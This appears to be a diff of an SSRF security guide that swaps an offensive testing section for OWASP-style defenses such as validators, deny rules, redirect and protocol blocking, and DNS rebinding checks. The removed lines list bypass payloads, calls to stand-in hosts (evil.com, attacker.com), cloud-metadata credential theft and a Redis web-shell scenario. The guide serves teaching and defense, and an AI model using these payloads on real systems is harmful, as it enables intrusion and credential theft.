-http://127.0.0.1.nip.io/ (DNS that resolves to 127.0.0.1)
-http://spoofed.burpcollaborator.net/ (custom DNS pointing to 127.0.0.1)
-http://2130706433/ (decimal: 127*256^3 + 0*256^2 + 0*256 + 1)
-http://0177.0.0.1/ (octal)
-http://0x7f.0x0.0x0.0x1/ (hex)
-http://127.000.000.1/ (leading zeros)
-http://[::1]/ (IPv6 loopback)
-http://[0:0:0:0:0:0:0:1]/
-http://[0:0:0:0:0:ffff:127.0.0.1]/ (IPv4-mapped IPv6)
+**Example: OAuth redirect_uri**
+```http
+GET /oauth/authorize?redirect_uri=http://192.168.0.68/admin&client_id=abc
+
+Server validates client_id, then redirects to redirect_uri
+SSRF to internal admin!
 ```
 
-#### URL encoding / double encoding
-```text
-http://127.0.0.1/%61dmin (URL encode 'a')
-http://127.0.0.1/%2561dmin (double encode)
-http://127.0.0.1/admin%00 (null byte, historical)
-http://127.0.0.1/ADMIN (case variation)
-```
+## Prevention strategies (from OWASP)
 
-#### DNS rebinding (if multiple requests are made)
-Create a domain that alternates between safe IP (for validation) and internal IP (for actual request).
+### Defense Layer 1: Input validation (whitelist approach)
 
-#### Redirects (chain through allowed domain)
-If `example.com` is whitelisted and you control a redirect:
-```text
-http://example.com/redirect?to=http://169.254.169.254/latest/meta-data/
-```
+**For known destinations only:**
 
-Or find an open redirect on the target itself:
-```text
-http://target.tld/redirect?url=http://192.168.1.1/admin
-```
-
-### Whitelist bypass (when only certain domains are allowed)
-
-#### Credentials in URL (parser confusion)
-```text
-https://expected-host:fakepass@evil-host/
-https://expected-host@evil-host/
-```
-
-Parser may extract "expected-host" for validation but connect to "evil-host".
-
-#### Fragment / anchor (parser confusion)
-```text
-https://evil-host#expected-host
-https://evil-host#@expected-host
-```
-
-#### Subdomain tricks
-If whitelist checks for "expected-host" substring:
-```text
-https://expected-host.evil.com/
-https://evil.com?expected-host
-```
-
-#### URL encoding (validation vs request discrepancy)
-```text
-https://expected-host%2f@evil-host/
-https://expected-host%23@evil-host/
-https://expected-host%3f@evil-host/
-```
-
-If validator decodes but requester doesn't (or vice versa), mismatch occurs.
-
-#### CRLF injection (if poorly parsed)
-```text
-https://expected-host%0d%0aHost:%20evil-host/
-```
-
-#### IPv6 tricks (if validator doesn't handle IPv6)
-```text
-http://[::ffff:127.0.0.1]/
-http://[::ffff:c0a8:0001]/ (IPv6 for 192.168.0.1)
-```
-
-## Testing workflow (systematic SSRF discovery)
-
-### Step 1: Identify URL-based inputs
-Look for parameters/fields that:
-- Accept full URLs
-- Accept hostnames, IPs, or paths
-- Trigger outbound requests (webhooks, imports, fetches, proxies, redirects)
-
-### Step 2: Baseline behavior
-Send a safe external URL:
-```text
-http://example.com
-```
-
-Observe:
-- Response time
-- Response content
-- Error messages
-- Side effects (logs, emails, external requests)
-
-### Step 3: Test localhost access
-```text
-http://127.0.0.1/
-http://localhost/
-http://0.0.0.0/
-```
-
-Look for:
-- Different response (content, length, status)
-- Internal service banners
-- Admin interfaces
-
-### Step 4: Enumerate internal services (where authorized)
-Port scan localhost:
-```text
-http://127.0.0.1:80
-http://127.0.0.1:8080
-http://127.0.0.1:3000
-http://127.0.0.1:6379
-http://127.0.0.1:9200
-```
-
-Scan private IPs:
-```text
-http://192.168.0.1/
-http://192.168.1.1/
-http://10.0.0.1/
-```
-
-### Step 5: Test cloud metadata (if in cloud environment)
-```text
-http://169.254.169.254/latest/meta-data/
-http://metadata.google.internal/computeMetadata/v1/
-```
-
-### Step 6: Test blind SSRF (if no response returned)
-Use out-of-band detection:
-```text
-http://unique-id.burpcollaborator.net
-http://ssrf-test.attacker.com
-```
-
-Check for DNS/HTTP callbacks.
-
-### Step 7: Exploit deeper
-- Fetch credentials from metadata
-- Access admin panels
-- Exfiltrate internal API responses
-- Chain with other bugs (open redirect, XXE)
-
-## Real-world impact examples (what attackers do)
-
-### Scenario 1: Cloud credential theft
-```text
-1. Find SSRF in image fetch endpoint
-2. Request http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role
-3. Extract temporary AWS keys from response
-4. Use keys to access S3 buckets, RDS databases, other AWS resources
-```
-
-### Scenario 2: Internal admin panel access
-```text
-1. Find SSRF in PDF generator
-2. Request http://localhost:8080/admin
-3. Bypass "localhost-only" restriction
-4. Extract user database, change passwords, elevate privileges
-```
-
-### Scenario 3: Redis exploitation → RCE
-```text
-1. Find SSRF supporting gopher:// or dict://
-2. Use protocol smuggling to send Redis commands
-3. Write web shell to disk via Redis persistence
-4. Access web shell for RCE
-```
-
-### Scenario 4: Port scanning and pivoting
-```text
-1. Find blind SSRF
-2. Scan internal network for open ports (timing-based)
-3. Identify internal services (SSH, databases, admin panels)
-4. Use as pivot point to map internal infrastructure
-```
-
-## Prevention (what developers must do)
-
-### 1) Validate and sanitize URLs (defense in depth)
-- Allow-list protocols: only `http://` and `https://` (no `file://`, `gopher://`, `dict://`, etc.)
-- Allow-list domains/IPs: only external, public destinations
-- Deny private IPs and localhost by default
-
-IP deny-list (Python example):
+**Validate IP addresses:**
 ```python
 import ipaddress
 
-def is_private_ip(hostname):
+def is_valid_public_ip(ip_string):
     try:
-        ip = ipaddress.ip_address(hostname)
-        return ip.is_private or ip.is_loopback or ip.is_link_local
-    except:
+        ip = ipaddress.ip_address(ip_string)
+        
+        # Reject private IPs
+        if ip.is_private:
+            return False
+        
+        # Reject loopback
+        if ip.is_loopback:
+            return False
+        
+        # Reject link-local
+        if ip.is_link_local:
+            return False
+        
+        # Reject multicast
+        if ip.is_multicast:
+            return False
+        
+        # Must be public
+        return ip.is_global
+        
+    except ValueError:
         return False
 
-def validate_url(url):
-    parsed = urlparse(url)
-    if parsed.scheme not in ['http', 'https']:
-        raise ValueError("Invalid protocol")
-    
-    if is_private_ip(parsed.hostname):
-        raise ValueError("Private IP not allowed")
+# Usage
+if not is_valid_public_ip(user_ip):
+    raise ValueError("Private IP addresses not allowed")
 ```
 
-### 2) Resolve hostnames and check resolved IPs
-Don't just validate the hostname string; resolve it and check the IP.
-
+**Validate domain names:**
 ```python
-import socket
+import re
 
-def get_ip(hostname):
-    return socket.gethostbyname(hostname)
-
-def validate_destination(url):
-    hostname = urlparse(url).hostname
-    ip = get_ip(hostname)
-    if is_private_ip(ip):
-        raise ValueError("Resolves to private IP")
+def is_valid_domain(domain):
+    # Regex for valid domain name
+    pattern = r'^(((?!-))(xn--|_)?[a-z0-9-]{0,61}[a-z0-9]\.)*([a-z0-9][a-z0-9\-]{0,60}|[a-z0-9-]{1,30}\.[a-z]{2,})$'
+    
+    if not re.match(pattern, domain.lower()):
+        return False
+    
+    # Additional checks
+    if domain.startswith('.') or domain.endswith('.'):
+        return False
+    
+    return True
 ```
 
-Beware DNS rebinding: re-check IP immediately before making the actual request.
+**Whitelist specific domains:**
+```python
+ALLOWED_DOMAINS = [
+    'api.trusted.com',
+    'api.partner.com'
+]
 
-### 3) Use separate, restricted network contexts
-- Run outbound request functionality in isolated containers/VMs with no access to internal networks.
-- Use egress firewalls to block private IP ranges and cloud metadata endpoints.
-- Use network policies to deny access to localhost and RFC 1918 ranges.
+def is_allowed_domain(url):
+    from urllib.parse import urlparse
+    
+    parsed = urlparse(url)
+    hostname = parsed.hostname
+    
+    return hostname in ALLOWED_DOMAINS
+```
 
-### 4) Disable unnecessary protocols and redirects
-- Configure HTTP client libraries to reject redirects or limit redirect chains.
-- Disable file://, gopher://, dict://, ftp://, etc.
+### Defense Layer 2: Network layer controls
 
-Python requests example:
+**Firewall rules:**
+```
+Application server (10.0.1.5):
+- Allow outbound to: api.trusted.com (203.0.113.10)
+- Allow outbound to: api.partner.com (203.0.113.20)
+- Deny outbound to: 10.0.0.0/8 (internal network)
+- Deny outbound to: 192.168.0.0/16 (private network)
+- Deny outbound to: 127.0.0.0/8 (loopback)
+- Deny outbound to: 169.254.169.254/32 (metadata service)
+```
+
+**Network segregation:**
+```
+DMZ (Demilitarized Zone):
+- Web application servers
+- Can only reach specific external APIs
+- Cannot reach internal network
+
+Internal Network:
+- Admin panels
+- Databases
+- Not accessible from DMZ
+```
+
+### Defense Layer 3: Disable redirects
+
 ```python
 import requests
 
-response = requests.get(url, allow_redirects=False, timeout=5)
+# Disable automatic redirects
+response = requests.get(user_url, allow_redirects=False)
+
+# Check for redirect manually
+if response.status_code in [301, 302, 303, 307, 308]:
+    raise ValueError("Redirects not allowed")
 ```
 
-### 5) Use allow-lists for known-good destinations
-If the application only needs to fetch from a few external APIs, allow-list them explicitly.
+### Defense Layer 4: Disable dangerous protocols
 
 ```python
-ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']
+from urllib.parse import urlparse
+
+ALLOWED_PROTOCOLS = ['http', 'https']
 
 def validate_url(url):
-    hostname = urlparse(url).hostname
-    if hostname not in ALLOWED_HOSTS:
-        raise ValueError("Host not allowed")
+    parsed = urlparse(url)
+    
+    if parsed.scheme not in ALLOWED_PROTOCOLS:
+        raise ValueError(f"Protocol {parsed.scheme} not allowed")
+    
+    return True
+
+# Blocks: file://, gopher://, ftp://, dict://
 ```
 
-### 6) Metadata service protections (cloud-specific)
-AWS: Enable IMDSv2 (requires token, harder to exploit via SSRF):
-```bash
-aws ec2 modify-instance-metadata-options \
-    --instance-id i-1234567890abcdef0 \
-    --http-tokens required \
-    --http-put-response-hop-limit 1
+### Defense Layer 5: Response handling
+
+**Don't return raw responses:**
+```python
+# BAD - Returns raw response
+def fetch_url(url):
+    response = requests.get(url)
+    return response.text  # Might leak internal data
+
+# GOOD - Process and sanitize
+def fetch_url_safe(url):
+    response = requests.get(url)
+    
+    # Extract only needed data
+    data = json.loads(response.text)
+    return {
+        'status': data.get('status'),
+        'message': data.get('message')
+    }
+    # Doesn't return raw internal responses
 ```
 
-GCP: Use Workload Identity instead of relying on metadata service.
+### Defense Layer 6: Use allowlist with authentication
 
-Azure: Use Managed Identities with restricted scopes.
+**Whitelist approach with token validation:**
 
-### 7) Monitoring and detection
-Log all outbound requests:
-- Destination (hostname, IP, port)
-- Source (which user/request triggered it)
-- Response (status, size, timing)
+```python
+import secrets
 
-Alert on:
-- Requests to private IPs or localhost
-- Requests to cloud metadata endpoints
-- Unusual ports (6379, 9200, etc.)
-- High volumes of failed requests (scanning behavior)
+# Generate token for legitimate request
+def generate_callback_token():
+    return secrets.token_urlsafe(32)
 
-## Quick tester payload set (authorized use)
+# Store expected callback
+def register_callback(url, token):
+    redis.setex(f"callback:{token}", 3600, url)
 
-Localhost variants:
-```text
-http://127.0.0.1/
-http://localhost/
-http://127.1/
-http://0.0.0.0/
-http://[::1]/
-http://2130706433/
+# Validate callback
+def validate_callback(url, token):
+    expected_url = redis.get(f"callback:{token}")
+    
+    if expected_url is None:
+        return False
+    
+    if expected_url != url:
+        return False
+    
+    return True
+
+# Usage:
+# 1. User requests webhook: GET /register-webhook?url=https://user.com/webhook
+# 2. Server generates token, returns to user
+# 3. When server makes callback, includes token: POST https://user.com/webhook?token=abc123
+# 4. Receiving service can verify token matches registered URL
 ```
 
-Private network targets:
-```text
-http://192.168.0.1/
-http://10.0.0.1/
-http://172.16.0.1/
+### Defense Layer 7: DNS validation
+
+**Resolve and validate IP:**
+```python
+import socket
+import ipaddress
+
+def is_safe_url(url):
+    from urllib.parse import urlparse
+    
+    parsed = urlparse(url)
+    hostname = parsed.hostname
+    
+    try:
+        # Resolve domain to IP
+        ip_string = socket.gethostbyname(hostname)
+        ip = ipaddress.ip_address(ip_string)
+        
+        # Check if resolves to private IP
+        if ip.is_private or ip.is_loopback or ip.is_link_local:
+            return False
+        
+        # Additional check: Resolve again to prevent DNS rebinding
+        # (Check multiple times with delay)
+        time.sleep(1)
+        ip_string2 = socket.gethostbyname(hostname)
+        
+        if ip_string != ip_string2:
+            return False  # DNS rebinding attack detected
+        
+        return True
+        
+    except socket.gaierror:
+        return False
 ```
 
-Cloud metadata:
-```text
-http://169.254.169.254/latest/meta-data/
-http://metadata.google.internal/computeMetadata/v1/
+**Monitor allowlisted domains:**
+```python
+# Check that allowed domains don't resolve to private IPs
+import dns.resolver
+
+def monitor_allowed_domains():
+    for domain in ALLOWED_DOMAINS:
+        try:
+            answers = dns.resolver.resolve(domain, 'A')
+            
+            for rdata in answers:
+                ip = ipaddress.ip_address(rdata.to_text())
+                
+                if not ip.is_global:
+                    alert(f"SECURITY: {domain} resolves to private IP {ip}")
+        except:
+            pass
 ```
 
-Port scan (observe timing):
-```text
-http://127.0.0.1:22
-http://127.0.0.1:80
-http://127.0.0.1:443
-http://127.0.0.1:3306
-http://127.0.0.1:6379
-http://127.0.0.1:9200
-```
+### Complete secure implementation
 
-Blind SSRF detection:
-```text
-http://unique-id.burpcollaborator.net
-http://ssrf-test.attacker.com
+```python
+import requests
+import ipaddress
+import socket
+from urllib.parse import urlparse
+
+ALLOWED_DOMAINS = ['api.trusted.com']
+ALLOWED_PROTOCOLS = ['http', 'https']
+TIMEOUT = 5
+
+def fetch_external_url(url):
+    """
+    Secure URL fetching with comprehensive SSRF protection
+    """
+    
+    # Step 1: Parse URL
+    try:
+        parsed = urlparse(url)
+    except Exception as e:
+        raise ValueError(f"Invalid URL: {e}")
+    
+    # Step 2: Validate protocol
+    if parsed.scheme not in ALLOWED_PROTOCOLS:
+        raise ValueError(f"Protocol not allowed: {parsed.scheme}")
+    
+    # Step 3: Validate domain against whitelist
+    hostname = parsed.hostname
+    if hostname not in ALLOWED_DOMAINS:
+        raise ValueError(f"Domain not allowed: {hostname}")
+    
+    # Step 4: Resolve domain to IP
+    try:
+        ip_string = socket.gethostbyname(hostname)
+    except socket.gaierror:
+        raise ValueError(f"Cannot resolve domain: {hostname}")
+    
+    # Step 5: Validate IP is public
+    try:
+        ip = ipaddress.ip_address(ip_string)
+        
+        if ip.is_private:
+            raise ValueError("Domain resolves to private IP")
+        
+        if ip.is_loopback:
+            raise ValueError("Domain resolves to loopback")
+        
+        if ip.is_link_local:
+            raise ValueError("Domain resolves to link-local IP")
+        
+        if not ip.is_global:
+            raise ValueError("Domain does not resolve to public IP")
+            
+    except ValueError as e:
+        raise ValueError(f"IP validation failed: {e}")
+    
+    # Step 6: Make request with safety controls
+    try:
+        response = requests.get(
+            url,
+            timeout=TIMEOUT,
+            allow_redirects=False,  # Disable redirects
+            headers={'User-Agent': 'InternalApp/1.0'}
+        )
+    except requests.RequestException as e:
+        raise ValueError(f"Request failed: {e}")
+    
+    # Step 7: Check for redirects
+    if response.status_code in [301, 302, 303, 307, 308]:
+        raise ValueError("Redirects not allowed")
+    
+    # Step 8: Don't return raw response
+    # Extract only necessary data
+    if response.status_code == 200:
+        return {
+            'status': 'success',
+            'data': response.json()  # Assume JSON response
+        }
+    else:
+        return {
+            'status': 'error',
+            'code': response.status_code
+        }
 ```
